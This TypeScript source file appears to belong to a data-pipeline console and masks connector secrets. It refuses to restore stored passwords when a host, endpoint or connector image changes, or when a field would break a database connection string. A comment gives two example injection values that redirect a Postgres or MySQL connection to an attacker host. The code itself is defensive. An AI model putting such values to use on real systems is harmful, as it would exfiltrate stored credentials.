import { coreDestinationsMap, MASKED_SECRET } from "./destinations";
import { PropertyUI } from "./destinations";
import { db } from "../server/db";
import { getServerLog } from "../server/log";
import get from "lodash/get";
import set from "lodash/set";
import unset from "lodash/unset";

import isPlainObject from "lodash/isPlainObject";
import isEqual from "lodash/isEqual";
import { ApiError } from "../shared/errors";

const log = getServerLog("secrets");

/**
 * Get all secret field paths for a destination type
 */
export function getDestinationSecretPaths(destinationType: string): string[] {
  const destination = coreDestinationsMap[destinationType];
  if (!destination) {
    return [];
  }

  const secretPaths: string[] = [];
  const credentialsUi = destination.credentialsUi || {};

  // Check each field in credentialsUi for password: true
  Object.entries(credentialsUi).forEach(([fieldName, fieldUi]) => {
    const ui = fieldUi as PropertyUI;
    if (ui.password) {
      secretPaths.push(fieldName);
    }
  });

  return secretPaths;
}

/**
 * Get all secret field paths for a service (Airbyte source)
 */
export async function getServiceSecretPaths(packageName: string, version: string): Promise<string[]> {
  try {
    const sourceSpec = await db.prisma().source_spec.findUnique({
      where: {
        package_version: {
          package: packageName,
          version: version,
        },
      },
    });

    if (!sourceSpec || !sourceSpec.specs) {
      return [];
    }

    const specs = sourceSpec.specs as any;
    const connectionSpec = specs.connectionSpecification;
    if (!connectionSpec || !connectionSpec.properties) {
      return [];
    }

    const secretPaths: string[] = [];

    // Recursively find all fields with airbyte_secret: true
    function findSecretFields(properties: any, basePath: string = "") {
      Object.entries(properties).forEach(([key, schema]: [string, any]) => {
        const currentPath = basePath ? `${basePath}.${key}` : key;

        if (schema.airbyte_secret === true) {
          secretPaths.push(`credentials.${currentPath}`);
        }

        // Handle oneOf/anyOf schemas
        if (schema.oneOf || schema.anyOf) {
          const options = schema.oneOf || schema.anyOf;
          options.forEach((option: any) => {
            if (option.properties) {
              findSecretFields(option.properties, currentPath);
            }
          });
        }

        // Recurse into nested objects
        if (schema.type === "object" && schema.properties) {
          findSecretFields(schema.properties, currentPath);
        }
      });
    }

    findSecretFields(connectionSpec.properties);
    return secretPaths;
  } catch (error) {
    log.atError().withCause(error).log(`Failed to get service secret paths for ${packageName}@${version}`);
    return [];
  }
}

/**
 * Mask secret values in an object based on the field paths
 */
export function maskSecrets(obj: any, secretPaths: string[]): any {
  if (!obj || typeof obj !== "object") {
    return obj;
  }

  const result = JSON.parse(JSON.stringify(obj)); // Deep clone

  for (const path of secretPaths) {
    const value = get(obj, path);
    if (typeof value !== "undefined") {
      set(result, path, MASKED_SECRET); // We don't mask non-set values
    }
  }

  return result;
}

/**
 * Remove masked values from an object before merge
 */
export function removeMaskedValues(obj: any, secretPaths: string[]): any {
  if (!obj || typeof obj !== "object") {
    return obj;
  }

  const result = JSON.parse(JSON.stringify(obj)); // Deep clone

  for (const path of secretPaths) {
    const value = get(obj, path);
    if (value === MASKED_SECRET) {
      unset(result, path); // Remove the masked value
    }
  }

  return result;
}

/**
 * Recursively replaces all occurrences of MASKED_SECRET in object with actual values from dbEntity.
 *
 * @param object - The d object being sent
 * @param dbEntity - The original entity from database containing real secret values
 * @param comparedWith - The original entity with schema defaults applied, to tell a changed target from a default
 * @returns A new object with masked secrets replaced by values from db
 */
export function unmaskSecretsFromOriginal(object: any, dbEntity: any, comparedWith: any = dbEntity): any {
  if (!object || !dbEntity) {
    return object;
  }

  // `object` is parsed with the schema defaults (a PostHog config without a host gets the default host), the stored
  // config is not, so callers pass the stored one with the same defaults applied to compare against.
  const changedTargets = changedConnectionTargets(object, comparedWith);
  // Only signing keys masked (webhook signatureSecret): they sign requests and are never sent to the target
  const onlySigningKeysMasked = maskedPaths(object).every(path => SIGNING_KEY.test(String(path[path.length - 1])));
  const breakers = connectionStringBreakers(object, comparedWith);
  if (breakers.fields.length > 0 && !onlySigningKeysMasked && containsMaskedSecrets(object)) {
    throw new ApiError(connectionStringError(breakers), { status: 400 });
  }
  if (changedTargets.length > 0 && !onlySigningKeysMasked) {
    // Restoring the stored password into a config that points somewhere else would send it to that host
    throw new ApiError(
      `Cannot reuse saved secrets because ${changedTargets.join(
        ", "
      )} changed. Enter the secret values again to continue.`,
      { status: 400 }
    );
  }

  // Deep clone object to avoid mutating the original
  const result = JSON.parse(JSON.stringify(object));

  // Recursively find and replace masked secrets
  replaceMaskedSecrets(result, dbEntity, []);

  return result;
}

// Fields that decide where a credential is sent: host, url, endpoint, an API base, etc.
// `port` is left out on purpose: the submitted object is parsed with schema defaults, so a default port
// shows up as a difference against a stored config that never had one, and a port alone does not change the host
// `instanceConnectionName` is the Cloud SQL instance a Postgres connection goes to (private service connect)
const CONNECTION_TARGET_KEY = /host|url|uri|endpoint|server|address|domain|api_?base|instance_?connection_?name/i;
// TLS material (`sslServerCA` contains "server") says how to trust the target, not where it is
const TLS_KEY = /ssl|tls|cert/i;

const isEmptyValue = (v: any) => v === undefined || v === null || v === "" || (Array.isArray(v) && v.length === 0);

const isTargetKey = (key: string) => CONNECTION_TARGET_KEY.test(key) && !TLS_KEY.test(key);

// Snowflake's `account` becomes the host name (<account>.snowflakecomputing.com). The same word is a plain label on
// some Airbyte sources, so it is a target only for a Snowflake destination.
const targetKeyFor = (...roots: any[]): ((key: string) => boolean) =>
  roots.some(root => root?.destinationType === "snowflake")
    ? key => isTargetKey(key) || key === "account"
    : isTargetKey;

/** A list of plain values (ClickHouse and MongoDB `hosts`) is one target value, not a container to look inside. */
const isValueList = (v: any) => Array.isArray(v) && v.every(item => item === null || typeof item !== "object");

/**
 * Paths of connection target fields (host, url, endpoint...) whose value in `object` differs from `original`.
 * Only meaningful for an object that contains masked secrets: it tells whether the stored secrets
 * would be carried over to a different target.
 */
export function changedConnectionTargets(object: any, original: any): string[] {
  return containsMaskedSecrets(object)
    ? [
        ...changedServiceImage(object, original),
        ...findChangedTargets(object, original, [], targetKeyFor(object, original)),
      ]
    : [];
}

/**
 * A service (an Airbyte connector) is a Docker image that receives the stored credentials in its config file, so the
 * image is where they go: another `package` can read and send them anywhere, with no host field changing. A new
 * `version` of the same package is not a target (an upgrade must not ask for the credentials again; the tags of a
 * package are controlled by whoever owns it).
 */
function changedServiceImage(updated: any, original: any): string[] {
  return typeof updated?.package === "string" &&
    typeof original?.package === "string" &&
    updated.package.trim() !== original.package.trim()
    ? ["package"]
    : [];
}

function findChangedTargets(
  node: any,
  original: any,
  path: (string | number)[],
  isTarget: (key: string) => boolean
): string[] {
  if (Array.isArray(node)) {
    return node.flatMap((item, index) => findChangedTargets(item, original, [...path, index], isTarget));
  }
  if (!isPlainObject(node)) {
    return [];
  }
  return Object.entries(node).flatMap(([key, value]) => {
    const currentPath = [...path, key];
    if ((isPlainObject(value) || Array.isArray(value)) && !(isTarget(key) && isValueList(value))) {
      return findChangedTargets(value, original, currentPath, isTarget);
    }
    if (value === MASKED_SECRET || !isTarget(key)) {
      return [];
    }
    const before = get(original, currentPath);
    // an empty optional target is the same as an omitted one (S3 `endpoint: ""` is the default AWS endpoint)
    if (isEmptyValue(value) && isEmptyValue(before)) {
      return [];
    }
    return isEqual(value, before) ? [] : [currentPath.join(".")];
  });
}

// Bulker builds some connection strings by formatting the fields into one string, so a delimiter in a name field changes
// what the string means, while the stored password is still filled in:
// - Postgres and Redshift: `host=.. dbname=.. user=.. password=.. search_path=..`, no quoting. A space starts a new
//   setting, so `database: "events host=attacker.example"` connects to that host.
// - MySQL: `user:password@tcp(host:port)/database`, split by the driver at its last '@' and '/'. A database such as
//   `x@tcp(attacker.example:3306)/events` connects to that address and sends it a password starting with the stored one.
//   (A username cannot move the connection that way, and `user@server` usernames are legitimate, so only `database`.)
// Bulker now quotes or avoids the string (JITSU-270), but a console talking to an older Bulker must not rely on that.
const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
  postgres: {
    fields: ["database", "username", "defaultSchema"],
    breaker: /[\s'\\]/,
    what: "a space, quote or backslash",
  },
  redshift: {
    fields: ["database", "username", "defaultSchema"],
    breaker: /[\s'\\]/,
    what: "a space, quote or backslash",
  },
  mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
};

/**
 * Fields of a Postgres, Redshift or MySQL destination whose value would split or move the connection string, and what
 * is wrong with them. Whitespace at either end is ignored: it cannot start a setting (the Postgres reader skips it
 * after `=` and ends the value at it), and a stored schema with a leading space exists in production and has always
 * worked.
 */
export function connectionStringBreakers(...objects: any[]): { fields: string[]; what: string } {
  const type = objects
    .map(o => o?.destinationType)
    .find(t => typeof t === "string" && Object.prototype.hasOwnProperty.call(CONNECTION_STRING_TYPES, t));
  if (!type) {
    return { fields: [], what: "" };
  }
  const { fields, breaker, what } = CONNECTION_STRING_TYPES[type];
  const object = objects[0];
  return {
    fields: fields.filter(field => typeof object?.[field] === "string" && breaker.test(object[field].trim())),
    what,
  };
}

const connectionStringReason = ({ fields, what }: { fields: string[]; what: string }) =>
  `${fields.join(", ")} contains ${what}, which would change the connection`;

const connectionStringError = (breakers: { fields: string[]; what: string }) =>
  `Cannot reuse saved secrets because ${connectionStringReason(breakers)}. Enter the secret values again to continue.`;

// Secrets that are used to sign requests and are never sent to the connection target
const SIGNING_KEY = /signature|signing|hmac/i;

/** Paths of every MASKED_SECRET value in an object. */
function maskedPaths(node: any, path: (string | number)[] = []): (string | number)[][] {
  if (node === MASKED_SECRET) {
    return [path];
  }
  if (Array.isArray(node)) {
    return node.flatMap((item, index) => maskedPaths(item, [...path, index]));
  }
  if (isPlainObject(node)) {
    return Object.entries(node).flatMap(([key, value]) => maskedPaths(value, [...path, key]));
  }
  return [];
}

/**
 * Paths of connection target fields (host, url, endpoint...) whose value differs between two objects, an empty value
 * counting as no value. Unlike {@link changedConnectionTargets} it does not need a masked secret in the object.
 */
export function changedTargetFieldsBetween(updated: any, original: any): string[] {
  return [
    ...changedServiceImage(updated, original),
    ...targetFieldsBetween(updated, original, [], targetKeyFor(updated, original)),
  ];
}

function targetFieldsBetween(
  updated: any,
  original: any,
  path: (string | number)[],
  isTarget: (key: string) => boolean
): string[] {
  if (Array.isArray(updated)) {
    return updated.flatMap((item, index) => targetFieldsBetween(item, original, [...path, index], isTarget));
  }
  if (!isPlainObject(updated)) {
    return [];
  }
  return Object.entries(updated).flatMap(([key, value]) => {
    const currentPath = [...path, key];
    if ((isPlainObject(value) || Array.isArray(value)) && !(isTarget(key) && isValueList(value))) {
      return targetFieldsBetween(value, original, currentPath, isTarget);
    }
    if (!isTarget(key)) {
      return [];
    }
    const before = get(original, currentPath);
    if (isEmptyValue(value) && isEmptyValue(before)) {
      return [];
    }
    return isEqual(value, before) ? [] : [currentPath.join(".")];
  });
}

/**
 * An update that keeps stored secrets (masked values and omitted fields both keep them) must not point the object at
 * a different host: that would send the stored password to wherever the editor says. When a connection target changes,
 * every secret that has a stored value has to be supplied again in the patch.
 *
 * @param original the stored object, before the merge
 * @param patch the incoming patch, with masked values still in it
 * @param merged the result of merging the patch into the original
 */
export function assertSecretsStayWithTarget(original: any, patch: any, merged: any, secretPaths: string[]): void {
  const changed = changedTargetFieldsBetween(merged, original);
  const breakers = connectionStringBreakers(merged, original);
  if (changed.length === 0 && breakers.fields.length === 0) {
    return;
  }
  const keptSecrets = secretPaths.filter(path => {
    // A signing key (webhook `signatureSecret`) only signs what is sent: the receiver never gets it
    if (SIGNING_KEY.test(String(path).split(".").pop() ?? "")) {
      return false;
    }
    const stored = get(original, path);
    if (isEmptyValue(stored)) {
      return false;
    }
    const supplied = get(patch, path);
    return isEmptyValue(supplied) || supplied === MASKED_SECRET;
  });
  if (keptSecrets.length > 0) {
    const reason = changed.length > 0 ? `${changed.join(", ")} changed` : connectionStringReason(breakers);
    throw new ApiError(
      `Cannot keep the saved secrets (${keptSecrets.join(
        ", "
      )}) because ${reason}. Enter the secret values again to continue.`,
      { status: 400 }
    );
  }
}

/**
 * Recursively walks through an object and replaces MASKED_SECRET values with actual values from dbEntity
 *
 * @param obj - Current object being processed
 * @param dbEntity - Original entity from database
 * @param path - Current path in the object structure
 */
function replaceMaskedSecrets(obj: any, dbEntity: any, path: (string | number)[]): void {
  if (!isPlainObject(obj) && !Array.isArray(obj)) {
    return;
  }

  if (Array.isArray(obj)) {
    obj.forEach((item, index) => {
      if (item === MASKED_SECRET) {
        // Replace masked value with value from db at the same path
        const dbValue = get(dbEntity, [...path, index]);
        if (dbValue !== undefined) {
          obj[index] = dbValue;
        }
      } else if (isPlainObject(item) || Array.isArray(item)) {
        replaceMaskedSecrets(item, dbEntity, [...path, index]);
      }
    });
  } else {
    Object.keys(obj).forEach(key => {
      const value = obj[key];
      const currentPath = [...path, key];

      if (value === MASKED_SECRET) {
        // Replace masked value with value from db at the same path
        const dbValue = get(dbEntity, currentPath);
        if (dbValue !== undefined) {
          obj[key] = dbValue;
        }
      } else if (isPlainObject(value) || Array.isArray(value)) {
        replaceMaskedSecrets(value, dbEntity, currentPath);
      }
    });
  }
}

/**
 * Checks if an object contains any masked secrets
 *
 * @param obj - Object to check for masked secrets
 * @returns true if object contains MASKED_SECRET values
 */
export function containsMaskedSecrets(obj: any): boolean {
  if (!obj) {
    return false;
  }

  if (obj === MASKED_SECRET) {
    return true;
  }

  if (Array.isArray(obj)) {
    return obj.some(item => containsMaskedSecrets(item));
  }

  if (isPlainObject(obj)) {
    return Object.values(obj).some(value => containsMaskedSecrets(value));
  }

  return false;
}
